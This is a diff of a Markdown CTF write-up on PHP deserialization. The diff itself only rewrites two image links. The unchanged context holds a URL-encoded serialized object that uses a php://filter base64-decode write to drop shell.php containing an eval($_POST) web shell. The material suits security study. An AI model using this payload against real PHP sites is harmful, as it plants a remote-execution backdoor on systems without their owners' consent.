@@ -1,4 +1,4 @@
-![[Pasted image 20230227192525.png|500]]
+![](<./img/Pasted image 20230227192525.png>)
 好长的hint.jpg
 
 ```php
@@ -283,6 +283,6 @@ print(urlencode(serialize(new A())));
 O%3A1%3A%22A%22%3A5%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A2%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22strval%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3BN%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A39%3A%22000PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7ID8%2B%22%3B%7D
 ```
 
-![[Pasted image 20230227230646.png|1000]]
+![](<./img/Pasted image 20230227230646.png>)
 
 #Web #PHP #serialization #base64 #伪协议 #可变变量
